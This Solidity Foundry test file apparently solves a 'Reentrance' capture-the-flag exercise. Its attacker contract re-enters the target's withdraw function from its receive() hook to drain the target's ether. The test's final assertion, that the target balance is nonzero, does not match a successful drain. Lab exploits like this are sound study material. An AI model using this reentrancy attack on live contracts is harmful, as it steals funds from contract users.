// SPDX-License-Identifier: MIT
pragma solidity 0.8.0;
import {Test, console} from "../lib/forge-std/src/Test.sol";

import {Reentrance} from "../src/Reentrance.sol";

contract ReentranceTest is Test {
    Reentrance target;
    ReentranceHacker hackTarget;

    function setUp() public {
        target = new Reentrance();
        hackTarget = new ReentranceHacker(address(target));
    }

    function test_ReentranceToReceiveEther() public {
        hackTarget.attack{value: 1 ether}();
        assert(address(target).balance != 0);
    }
}

contract ReentranceHacker {
    Reentrance public target;
    constructor(address _target) {
        target = Reentrance(_target);
    }

    function attack() public payable {
        target.donate{value: msg.value}(address(this));
        target.withdraw(msg.value);
    }

    receive() external payable {
        if (address(target).balance > 0) {
            target.withdraw(address(target).balance);
        }
    }
}
